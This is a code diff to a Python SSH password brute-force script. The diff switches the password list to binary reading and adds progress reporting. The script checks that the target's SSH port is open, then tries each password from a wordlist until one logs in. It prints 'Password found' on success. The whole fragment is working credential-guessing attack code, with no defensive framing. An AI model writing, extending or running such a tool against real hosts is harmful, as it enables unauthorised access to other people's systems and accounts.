@@ -46,16 +46,26 @@ if not check_ssh_port(target, port):
     print(f"Port {port} is closed on {target}")
     exit(1)
 
-with open(password_file, 'r') as file:
-    for line in file:
-        password = line.strip()
+with open(password_file, 'rb') as file:
+    passwords = file.readlines()
+    total_passwords = len(passwords)
+
+    print("Please wait, trying to brute force...")
+    for i, password in enumerate(passwords):
+        password = password.strip()
 
         try:
             if ssh_connect(password, port):
-                print('Password found: ' + password)
+                print('Password found: ' + password.decode("utf-8"))
                 break
             else:
-                print('No luck with ' + password)
+                print('No luck with ' + password.decode("utf-8"))
         except Exception as e:
             print(e)
             pass
+
+        percentage = (i + 1) / total_passwords * 100
+        print("\033[32mProgress: {:.2f}%\033[0m".format(percentage))
+
+
+print("Brute force complete.")
